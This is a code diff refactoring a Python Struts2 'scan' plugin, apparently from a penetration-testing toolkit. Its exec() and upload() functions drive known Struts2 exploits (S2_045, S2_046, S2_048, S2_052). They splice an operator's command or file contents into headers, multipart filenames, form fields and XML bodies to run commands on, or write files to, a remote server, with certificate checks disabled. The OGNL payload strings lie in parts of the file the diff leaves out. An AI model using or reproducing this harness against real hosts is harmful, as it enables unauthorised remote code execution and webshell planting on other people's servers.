@@ -2,126 +2,96 @@
 # -*- coding: utf-8 -*-
 __author__ = 'orleven'
 
-
+import requests
+import urllib.parse
+requests.packages.urllib3.disable_warnings()
 
 def get_script_info(data=None):
     script_info = {
         "name": "Struts scan",
-        "info": "This is a test.",
-        "level": "low",
+        "info": "Struts vul scan.",
+        "level": "high",
         "type": "info",
-        "author": "orleven",
-        "url": "",
-        "keyword": "tag:iis",
-        "source": 1
     }
     return script_info
 
 def prove(data):
-    '''
-    data = {
-        "target_host":"",
-        "target_port":"",
-        "proxy":"",
-        "dic_one":"",
-        "dic_two":"",
-        "cookie":"",
-        "url":"",
-        "flag":"",
-        "data":"",
-        "":"",
-
-    }
-
-    '''
-
-    headers = {}
-    if 'cookie' in data.keys():
-        headers["Cookie"] = data['cookie']
-    headers[
-        "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
-
-    vulname = ''
-    data, base_url =  _url_deal(headers,data)
-    struts2 = _struts2(headers,data,base_url)
-    if vulname == '':
-        for vul in struts2.prove_poc.keys():
-            flag, res = struts2.prove(vul)
+    data = init(data, 'web')
+    if data['url'] != None:
+        vulname = ''
+        data, base_url =  _url_deal(data['headers'],data)
+        struts2 = _struts2(data['headers'],data,base_url,data['timeout'])
+        if vulname == '':
+            for vul in struts2.prove_poc.keys():
+                flag, res = struts2.prove(vul)
+                if flag:
+                    data['flag'] = 1
+                    data['data'].append({"vulname": ""})
+                    data['res'].append({"info": res , "key": vul})
+        else:
+            flag, res = struts2.prove(vulname)
             if flag:
-                data['flag'] = True
+                data['flag'] = 1
                 data['data'].append({"vulname": ""})
-                data['res'].append({"info": res , "key": vul})
-    else:
-        flag, res = struts2.prove(vulname)
-        if flag:
-            data['flag'] = True
-            data['data'].append({"vulname": ""})
-            data['res'].append({"info": res, "key": vulname})
-    return data
+                data['res'].append({"info": res, "key": vulname})
+        return data
 
 
 def exec(data=None):
-    headers = {}
-    if 'cookie' in data.keys():
-        headers["Cookie"] = data['cookie']
-    headers[
-        "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
-
-    vulname = ''
-    data, base_url = _url_deal(headers, data)
-    struts2 = _struts2(headers, data, base_url)
-    if 'cmd' not in data.keys() :
-        raise Exception("None cmd ")
-    if vulname == '':
-        for vul in struts2.exec_poc.keys():
-            flag, res = struts2.exec(vul,data['cmd'])
+    data = init(data, 'web')
+    if data['url'] != None:
+        vulname = ''
+        data, base_url = _url_deal(data['headers'], data)
+        struts2 = _struts2(data['headers'], data, base_url,data['timeout'])
+        if 'cmd' not in data.keys() :
+            raise Exception("None cmd ")
+        if vulname == '':
+            for vul in struts2.exec_poc.keys():
+                flag, res = struts2.exec(vul,data['cmd'])
+                if flag:
+                    data['flag'] = 1
+                    data['data'].append({"vulname": ""})
+                    data['res'].append({"info": res, "key": vul})
+        else:
+            flag, res = struts2.exec(vulname,data['cmd'])
             if flag:
-                data['flag'] = True
+                data['flag'] = 1
                 data['data'].append({"vulname": ""})
-                data['res'].append({"info": res, "key": vul})
-    else:
-        flag, res = struts2.exec(vulname,data['cmd'])
-        if flag:
-            data['flag'] = True
-            data['data'].append({"vulname": ""})
-            data['res'].append({"info": res, "key": vulname})
+                data['res'].append({"info": res, "key": vulname})
 
     return data
 
 
 
 def upload(data=None):
-    headers = {}
-    if 'cookie' in data.keys():
-        headers["Cookie"] = data['cookie']
-    headers[
-        "User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
-
-    vulname = ''
-    data, base_url = _url_deal(headers, data)
-    struts2 = _struts2(headers, data, base_url)
-    if 'path' not in data.keys() :
-        raise Exception("None path ")
-    content = _read_file(data['path'])
-    if vulname == '':
-        for vul in struts2.upload_poc.keys():
-            flag, res = struts2.upload(vul,data['path'],content)
+    data = init(data, 'web')
+    if data['url'] != None:
+        vulname = ''
+        data, base_url = _url_deal(data['headers'], data)
+        struts2 = _struts2(data['headers'], data, base_url,data['timeout'])
+        if 'path' not in data.keys() :
+            raise Exception("None path ")
+        content = _read_file(data['path'])
+        if vulname == '':
+            for vul in struts2.upload_poc.keys():
+                flag, res = struts2.upload(vul,data['path'],content)
+                if flag:
+                    data['flag'] = 1
+                    data['data'].append({"vulname": ""})
+                    data['res'].append({"info": res, "key": vul})
+        else:
+            flag, res = struts2.upload(vulname,data['path'],content)
             if flag:
-                data['flag'] = True
+                data['flag'] = 1
                 data['data'].append({"vulname": ""})
-                data['res'].append({"info": res, "key": vul})
-    else:
-        flag, res = struts2.upload(vulname,data['path'],content)
-        if flag:
-            data['flag'] = True
-            data['data'].append({"vulname": ""})
-            data['res'].append({"info": res, "key": vulname})
+                data['res'].append({"info": res, "key": vulname})
 
     return data
 
 class _struts2:
-    def __init__(self,headers, data,base_url):
+    def __init__(self,headers, data,base_url,timeout):
         self.base_url = base_url
+        self.timeout = timeout
         self.headers = headers
         self.data = data
         self.prove_poc = {  # S2_019/S2_048/S2_037，S2_052 未验证
@@ -170,27 +140,26 @@ class _struts2:
 
 
     def prove(self,vulname):
-        import requests
-        requests.packages.urllib3.disable_warnings()
+
         headers = self.headers
         if vulname in self.prove_poc.keys():
             try:
                 if vulname == 'S2_045':
                     headers['Content-Type'] = self.prove_poc[vulname]
-                    res = requests.get(self.data['url'], headers=headers, timeout=5, verify=False)
+                    res = requests.get(self.data['url'], headers=headers, timeout=self.timeout, verify=False)
                 elif vulname == 'S2_046':
                     files = {"test": (self.prove_poc[vulname], "text/plain")}
-                    res = requests.post(self.data['url'], headers=headers, files=files, timeout=5, verify=False)
+                    res = requests.post(self.data['url'], headers=headers, files=files, timeout=self.timeout, verify=False)
                 elif vulname == 'S2_048':
                     data = 'name=' + self.prove_poc[vulname] + '&age=a&__checkbox_bustedBefore=true&description=s'
                     res = requests.get(self.base_url + '/struts2-showcase/integration/saveGangster.action', params=data,
-                                    headers=headers, timeout=5, verify=False)
+                                    headers=headers, timeout=self.timeout, verify=False)
                 elif vulname == 'S2_052':
                     headers['Content-Type'] = "application/xml"
-                    res = requests.post(self.data['url'], data=self.prove_poc[vulname], headers=headers, timeout=5, verify=False)
+                    res = requests.post(self.data['url'], data=self.prove_poc[vulname], headers=headers, timeout=self.timeout, verify=False)
                 else:
                     headers["Content-Type"] = "application/x-www-form-urlencoded"
-                    res = requests.get(self.data['url'], params= self.prove_poc[vulname], headers=headers, timeout=5, verify=False)
+                    res = requests.get(self.data['url'], params= self.prove_poc[vulname], headers=headers, timeout=self.timeout, verify=False)
                 if self.poc_key[vulname] in res.headers or self.poc_key[vulname] in res.text:
                     return True,self.poc_key[vulname]+"_"+vulname
             except:
@@ -205,10 +174,10 @@ class _struts2:
             try:
                 if vulname == 'S2_045':
                     headers['Content-Type'] = self.exec_poc[vulname].replace("%COMMAND%",cmd)
-                    res = requests.get(self.data['url'], headers=headers, timeout=5, verify=False).text
+                    res = requests.get(self.data['url'], headers=headers, timeout=self.timeout, verify=False).text
                 elif vulname == 'S2_046':
                     files = {"test": (self.exec_poc[vulname].replace("%COMMAND%",cmd), "text/plain")}
-                    r = requests.post(self.data['url'], headers=headers, files=files, timeout=5, verify=False, stream=True)
+                    r = requests.post(self.data['url'], headers=headers, files=files, timeout=self.timeout, verify=False, stream=True)
                     res = ""
                     try:
                         for line in r.iter_lines():
@@ -219,18 +188,18 @@ class _struts2:
                 elif vulname == 'S2_048':
                     data = 'name=' +self.exec_poc[vulname].replace("%COMMAND%",cmd) + '&age=a&__checkbox_bustedBefore=true&description=s'
                     res = requests.post(self.base_url + '/struts2-showcase/integration/saveGangster.action', data=data,
-                                    headers=headers, timeout=5, verify=False).text
+                                    headers=headers, timeout=self.timeout, verify=False).text
                 elif vulname == 'S2_052':
                     headers['Content-Type'] = "application/xml"
                     command = ""
                     cmds = cmd.split()
                     for each in cmds:
                         command += "<string>" + each + "</string>"
-                    res = requests.post(self.data['url'], data=self.exec_poc[vulname].replace("%COMMAND%",command), headers=headers, timeout=5, verify=False).text
+                    res = requests.post(self.data['url'], data=self.exec_poc[vulname].replace("%COMMAND%",command), headers=headers, timeout=self.timeout, verify=False).text
                 else:
                     headers["Content-Type"] = "application/x-www-form-urlencoded"
                     res = requests.get(self.data['url'], params=self.exec_poc[vulname].replace("%COMMAND%",cmd), headers=headers,
-                                   timeout=5, verify=False).text
+                                   timeout=self.timeout, verify=False).text
                 return True, vulname + "_" + res
             except:
                 pass
@@ -239,62 +208,48 @@ class _struts2:
     def upload(self, vulname,path, content):
         # %PATH%
         # %FILECONTENT%
-        import requests
-        requests.packages.urllib3.disable_warnings()
         headers = self.headers
         if vulname in self.upload_poc.keys():
             try:
                 if vulname == 'S2_045':
                     headers['Content-Type'] = self.upload_poc[vulname].replace("%PATH%", path).replace("%FILECONTENT%", content)
-                    res = requests.get(self.data['url'], headers=headers, timeout=5,data=content, verify=False).text
+                    res = requests.get(self.data['url'], headers=headers, timeout=self.timeout,data=content, verify=False).text
                 elif vulname == 'S2_046':
                     files = {"test": (self.upload_poc[vulname].replace("%PATH%", path).replace("%FILECONTENT%", content), "text/plain")}
-                    res = requests.post(self.data['url'], headers=headers, files=files, timeout=5, verify=False).text
+                    res = requests.post(self.data['url'], headers=headers, files=files, timeout=self.timeout, verify=False).text
                 elif vulname == 'S2_048':
                     data = 'name=' + self.upload_poc[vulname].replace("%PATH%",
                                                                 path).replace("%FILECONTENT%", content) + '&age=a&__checkbox_bustedBefore=true&description=s'
                     res = requests.post(self.base_url + '/struts2-showcase/integration/saveGangster.action', data=data,
-                                    headers=headers, timeout=5, verify=False).text
+                                    headers=headers, timeout=self.timeout, verify=False).text
                 elif vulname == 'S2_052':
                     headers['Content-Type'] = "application/xml"
                     res = requests.post(self.data['url'], data=self.upload_poc[vulname].replace("%PATH%", path).replace("%FILECONTENT%", content),
-                                    headers=headers, timeout=5, verify=False).text
+                                    headers=headers, timeout=self.timeout, verify=False).text
                 else:
                     headers["Content-Type"] = "application/x-www-form-urlencoded"
                     res = requests.get(self.data['url'], params=self.upload_poc[vulname].replace("%PATH%", path).replace("%FILECONTENT%", content),
                                    headers=headers,
-                                   timeout=5, verify=False).text
+                                   timeout=self.timeout, verify=False).text
                 return True, vulname + "_" + path
             except:
                     pass
         return False, None
 
-def _curl_status(data, url, headers):
-    import requests
-    requests.packages.urllib3.disable_warnings()
+def _curl_status(data, url, headers,timeout):
     try:
-        requests.get(url, headers=headers, verify=False, timeout=5)
+        requests.get(url, headers=headers, verify=False, timeout=timeout)
         return True
     except:
         return False
 
 def _url_deal(headers,data):
-    import urllib.parse
-    if 'url' in data.keys() and data['url'] != None:
+    if data['url']:
         protocol, s1 = urllib.parse.splittype(data['url'])
         host, s2 = urllib.parse.splithost(s1)
         host, port = urllib.parse.splitport(host)
-        port = port if port != None else 443 if protocol == 'https' else 80
+        port = data['target_port'] if port != None else 443 if protocol == 'https' else 80
         base_url = protocol + "://" + host + ":" + str(port)
-    else:
-        if data['target_port'] == 0:
-            target = data['target_host']
-        else:
-            target = data['target_host'] + ":" + str(data['target_port'])
-        for pro in ['http://', "https://"]:
-            if _curl_status(data, pro + target, headers):
-                data['url'] = base_url = pro + target
-                break
     return data,base_url
 
 def _read_file(dicname):
